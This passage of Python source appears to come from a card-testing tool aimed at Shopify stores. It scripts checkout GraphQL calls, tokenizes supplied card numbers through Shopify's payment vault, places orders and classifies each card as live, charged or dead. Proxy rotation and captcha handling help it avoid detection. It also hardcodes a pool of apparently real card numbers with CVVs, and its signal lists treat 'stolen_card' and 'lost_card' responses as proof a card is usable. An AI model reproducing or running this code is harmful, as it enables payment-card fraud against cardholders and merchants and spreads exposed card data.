            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
            checkout_url = str(response.url)

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
            
            text = await response.text()
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, 'data-session-token="', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')
            
            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
            
            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)
            
            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
            
            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            # Extract build ID (commitSha), source token, and identification signature
            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
            
            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)
            
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')
            
            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
            if ident_match:
                ident_sig = ident_match.group(1)
            
            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency
            
            # Add checkout-specific headers for modern Shopify (matching working Go implementation)
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            params = {'operationName': 'Proposal'}
            
            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '', 'city': '', 'countryCode': country_code,
                                'lastName': '', 'zoneCode': 'ENG', 'phone': ''
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'operationName': 'Proposal'
            }

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            
            for i in range(2):
                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
                )
                if i == 0:
                    await asyncio.sleep(3)
            
            if not response:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            
            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency

            if 'errors' in resp_json:
                errors = resp_json.get('errors', [])
                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

            try:
                if 'data' not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency
                
                session_data = resp_json['data'].get('session')
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency
                
                negotiate = session_data.get('negotiate')
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency
                
                result = negotiate.get('result')
                if result is None:
                    return False, "Result is null", gateway, total_price, currency
                
                result_type = result.get('__typename', 'Unknown')
                
                if result_type == 'CheckpointDenied':
                    return False, f"Checkpoint Denied", gateway, total_price, currency
                
                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency
                
                checkpoint_data = result.get('checkpointData')
                
                seller_proposal = result.get('sellerProposal')
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency
                
                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')
                
                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                
                running_total = running_total_data['value']['amount']
                
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency
            
            delivery_type = delivery_data.get('__typename', '')
            
            if delivery_type == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
            elif delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies and len(available_strategies) > 0:
                        delivery_strategy = available_strategies[0].get('handle', '')
                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(shipping_amount_data)
                        except:
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
            else:
                delivery_strategy = ''
                shipping_amount = 0.0
            
            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_data)
                else:
                    tax_amount = 0.0
            except:
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {})
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                payment_methods = payment_data.get('availablePaymentLines', [])
                for method in payment_methods:
                    payment_method = method.get('paymentMethod', {})
                    if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                        payment_identifier = payment_method.get('paymentMethodIdentifier')
                        displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
                        
                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        
                        break
            
            # ── delivery proposal ─────────────────────────────────────────────
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                'deliveryStrategyByHandle': {
                    'handle': delivery_strategy if delivery_strategy else '',
                    'customDeliveryRate': False
                },
                'options': {}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                'lines': [{'stableId': stableId or '1'}]
            }
            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
            )
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            # ── payment method fallback: try delivery proposal if shipping didn't give it ──
            if not payment_identifier:
                try:
                    drj = json.loads(resp_text)
                    dsp = (drj.get('data', {}) or {})
                    dsp = (dsp.get('session', {}) or {})
                    dsp = (dsp.get('negotiate', {}) or {})
                    dsp = (dsp.get('result', {}) or {})
                    dsp = (dsp.get('sellerProposal', {}) or {})
                    dp_data = dsp.get('payment', {}) or {}
                    if dp_data.get('__typename') == 'FilledPaymentTerms':
                        for method in dp_data.get('availablePaymentLines', []):
                            pm = method.get('paymentMethod', {})
                            if pm.get('paymentMethodIdentifier') or pm.get('name'):
                                payment_identifier = pm.get('paymentMethodIdentifier')
                                gateway = pm.get('extensibilityDisplayName') or pm.get('name', 'UNKNOWN')
                                try:
                                    total_price = str(float(running_total) + shipping_amount + tax_amount)
                                except Exception:
                                    pass
                                break
                except Exception:
                    pass

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency

            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }
            
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig
            
            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
            try:
                token_data = await response.json()
                token = token_data.get('id')
                if not token:
                    return False, 'Unable to get payment token', gateway, total_price, currency
            except Exception as e:
                return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency

            params = {'operationName': 'SubmitForCompletion'}
            
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {
                                    'handle': delivery_strategy if delivery_strategy else '',
                                    'customDeliveryRate': False
                                },
                                'options': {'phone': phone}
                            },
                            'targetMerchandiseLines': {
                                'lines': [{'stableId': stableId or '1'}]
                            },
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {
                                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                            },
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {
                                'value': {'amount': subtotal, 'currencyCode': currency}
                            },
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                }
                            },
                            'amount': {
                                'value': {'amount': running_total, 'currencyCode': currency}
                            },
                            'dueAt': None
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {'amount': str(tax_amount), 'currencyCode': currency}
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }
            
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data
            
            submit_json_data = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
            )
            
            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            
            if "Your order total has changed." in text:
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency
            
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                
                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code')
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency
                
                result_type = submit_data.get('__typename', '')
                
                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        receipt_type = receipt.get('__typename', '')
                        
                        if receipt_type == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        
                        rid = receipt.get('id')
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                
                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown reason')
                    return False, extract_clean_response(reason), gateway, total_price, currency
                
                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code', '')
                            localized_msg = error.get('localizedMessage', '')
                            non_localized_msg = error.get('nonLocalizedMessage', '')
                            # If code is generic, prefer the localized/non-localized message for the real decline reason
                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                                detail = localized_msg or non_localized_msg
                                if detail:
                                    return False, detail, gateway, total_price, currency
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency
                
                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency
                
                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency
                
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            await asyncio.sleep(3)
            
            for i in range(4):
                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data, 
                    checkout_url, max_retries=1
                )
                
                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency
                
                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get('data', {}).get('receipt', {})
                    
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                # If code is generic, prefer the untranslated message for the real decline reason
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            # Handle other error types
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        
                        if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(4)
                            continue
                        
                except Exception as e:
                    pass
                
                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break
            
            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency
            
            try:
                res_json = json.loads(final_text)
                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif result:
                    return True, result, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except:
                pass
            
            code = extract_between(final_text, '{"code":"', '"')
            
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, f"OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, f"ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, f"Unknown Result", gateway, total_price, currency

    except Exception as e:
        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)



# ── Unified wrapper: returns same dict the old HTTP API returned ──────────────
async def shopify_check(cc_str: str, site: str, proxy_str: str | None) -> dict:
    """
    Calls process_card() directly (no external API).
    Returns: {Response, Gateway, Price, Status}
    """
    parts = cc_str.split('|')
    if len(parts) != 4:
        return {'Response': 'invalid card format', 'Gateway': '-', 'Price': '0', 'Status': False}
    cc, mes, ano, cvv = [p.strip() for p in parts]
    try:
        success, message, gateway, price, currency = await process_card_async(
            cc, mes, ano, cvv, site, None, proxy_str or None
        )
        try:
            price_f = float(price) if price else 0.0
        except Exception:
            price_f = 0.0
        return {
            'Response': message,
            'Gateway':  gateway or 'Shopify',
            'Price':    str(price_f),
            'Status':   success,
        }
    except Exception as ex:
        return {'Response': str(ex)[:120], 'Gateway': '-', 'Price': '0', 'Status': False}


# Test-card pool used for proxy + site validation
# Cards are rotated per-test so no single card gets rate-limited
_TEST_CARDS_POOL = [
    "5154623245618097|03|2032|156",
    "4766711002619292|07|2027|799",
    "4748443530139360|11|2027|375",
    "4748443520117194|02|2030|680",
    "4748443070224101|12|2028|192",
    "4748467794631002|02|2041|112",
    "4766715002545530|04|2027|181",
]
_TEST_SITE_PROXY = "https://hartford-prints-store.myshopify.com"

def _pick_test_card() -> str:
    return random.choice(_TEST_CARDS_POOL)

# ══════════════════════════════════════════
#  SMART PROXY ROTATOR
# ══════════════════════════════════════════
class SmartProxyRotator:
    """
    Round-robin proxy rotator with failure tracking.
    - Cycles proxies in order so every proxy gets used evenly.
    - Marks failures; after MAX_CONSECUTIVE_FAILS the proxy enters a
      cooldown period of COOLDOWN_SECS before being re-admitted.
    - On success the failure counter resets immediately.
    """
    MAX_CONSECUTIVE_FAILS = 3
    COOLDOWN_SECS         = 60   # seconds a bad proxy sits out

    def __init__(self, proxies: list):
        self._proxies    = list(proxies)
        self._index      = 0
        self._fails      = {}        # proxy -> consecutive fail count
        self._skip_until = {}        # proxy -> unix ts when usable again

    def reload(self, proxies: list):
        """Hot-reload the proxy list (called inside the worker loop)."""
        if proxies:
            self._proxies = list(proxies)
            self._index   = self._index % len(self._proxies)

    def get(self) -> str | None:
        """Return the next usable proxy (round-robin, skipping cooldowns)."""
        now = time.time()
        n   = len(self._proxies)
        if not n:
            return None
        # Walk the ring until we find a proxy past its cooldown
        for _ in range(n):
            proxy = self._proxies[self._index % n]
            self._index = (self._index + 1) % n
            if self._skip_until.get(proxy, 0) <= now:
                return proxy
        # Every proxy is cooling down — return the one whose cooldown expires soonest
        if self._proxies:
            return min(self._proxies, key=lambda p: self._skip_until.get(p, 0))
        return None

    def mark_failure(self, proxy: str):
        """Increment the consecutive failure counter; enter cooldown if threshold hit."""
        self._fails[proxy] = self._fails.get(proxy, 0) + 1
        if self._fails[proxy] >= self.MAX_CONSECUTIVE_FAILS:
            self._skip_until[proxy] = time.time() + self.COOLDOWN_SECS
            self._fails[proxy]      = 0  # reset after cooldown starts
            logging.info(f"[PROXY] {proxy} entering {self.COOLDOWN_SECS}s cooldown")

    def mark_success(self, proxy: str):
        """Reset failure counter on success."""
        self._fails[proxy]      = 0
        self._skip_until[proxy] = 0

    @property
    def live_count(self) -> int:
        now = time.time()
        return sum(1 for p in self._proxies if self._skip_until.get(p, 0) <= now)


# ══════════════════════════════════════════
#  SIGNAL LISTS
# ══════════════════════════════════════════

# Proxy is DEAD only when these appear in the API response
_PROXY_DEAD_SIGNALS = (
    'proxy dead', 'invalid proxy format', 'no proxy', 'invalid proxy',
    'proxy error', 'proxy failed', 'cannot connect to proxy',
    'proxy connection failed', 'bad proxy',
    'error in 1st req', 'error in 1 req',
    'error in 2nd req', 'error in 2 req',
    'error in 1st request', 'error in first request',
    'error: ',
)

# Site is DEAD when these appear (card declines are NOT in this list)
_SITE_DEAD_SIGNALS = (
    'captcha_required', 'captcha required',
    'site dead', 'site errors',
    'no_session_token', 'no session token',
    'invalid url', 'invalid_url',
    'could not resolve', 'domain name not found',
    'name or service not known',
    'connection failed', 'connection refused',
    'empty reply from server',
    'tlsv1 alert', 'ssl routines', 'openssl ssl_connect', 'ssl error',
    'httperror504', 'http 404', 'http error',
    'bad gateway', 'service unavailable', 'gateway timeout',
    'login required', 'address not valid',
    'no proper json',
    'receipt id is empty', 'handle is empty',
    'product id is empty', 'tax amount is empty',
    'payment method identifier is empty',
    'failed to detect product',
    'failed to create checkout',
    'url rejected', 'malformed input',
    'amount_too_small', 'amount too small',
    'delivery_delivery_line_detail_changed',
    'delivery_address2_required',
    'all products sold out',
    'tokenize_fail', 'payments_payment_flexibility_terms_id_mismatch', 'merchandise_expected_price_mismatch',
    'Site not supported',
    'all_retries_failed',
)

# Card is DEAD (bank-level card death — overrides API Status=True)
_CARD_DEAD_SIGNALS = (
    'card_declined', 'card declined', 'your card was declined',
    'your card has been declined',
    'payment method declined', 'payment_method_declined',
    'transaction declined', 'transaction_declined',
    'card_blocked', 'your card has been blocked',
    'refused by bank',
    'card not accepted',
    'invalid card number', 'invalid_number', 'invalid number',
    'expired_card', 'expired card', 'card has expired',
    'invalid_expiry', 'invalid expiry',
    'submit rejected',
    'payments_credit_card_generic',
    'payments_credit_card_base_expired',
 'card_verification_value_invalid_for_card_type',
 
)

# Card is CHARGED (payment went through)
_CHARGED_SIGNALS = (
    'order_placed', 'order placed', 'order_completed', 'order completed',
    'payment_successful', 'payment successful', 'payment success',
    'successfully charged', 'charge_successful', 'charge successful',
    'thank you for your order', 'thank you for your payment',
    'thanks for your order', 'thanks for your purchase',
    'payment_confirmed', 'payment confirmed',
    'order_confirmed', 'order confirmed',
    'transaction_approved', 'transaction approved',
    'congratulations', 'your order has been placed',
    'purchase successful', 'purchase_successful',
    'payment intent succeeded', 'payment_intent.succeeded',
    'payment_received', 'payment.capture.successful', 'invoice.paid',
    'charge.captured', 'checkout.session.completed', 'transaction.settled',
    'payment_approved', 'capture_success', 'authorization_successful',
    'order.processed', 'your order is on its way', 'receipt for your purchase',
    'secure checkout success', 'transaction complete', 'order received',
    "we've got your order", 'your payment was processed successfully',
    'authorized successfully', 'billing successful', 'approval',
    'approved or completed successfully', 'settled', 'captured', 'auth_approved'
)

# Card is LIVE / APPROVED (bank responded, card is real)
_APPROVED_SIGNALS = (
    'insufficient_funds', 'insufficient funds', 'insufficient fund',
    'not_sufficient_funds', 'no_funds',
    'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
    'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
    'cvv2 mismatch', 'cvv does not match', 'security code',
    'incorrect_zip', 'incorrect zip', 'zip_mismatch', 'avs_mismatch',
    'avs mismatch', 'postal code',
    'do_not_honor', 'do not honor',
    'generic_decline', 'generic decline',     # bank responded → card is real
    'stolen_card', 'stolen card',
    'lost_card', 'lost card',
    'restricted_card', 'restricted card',
    'pickup_card', 'pick up card',
    'card_velocity_exceeded', 'velocity exceeded',
    'authentication_required', 'authentication required',
    'otp_required', 'otp required',
    '3d_secure', '3d secure', '3ds',
    'approved',
)

# ══════════════════════════════════════════
#  BASE64 PROXY CREDENTIAL DECODER
# ══════════════════════════════════════════
def _is_base64url(s: str) -> bool:
    """
    Returns True if the string looks like a base64url-encoded credential.
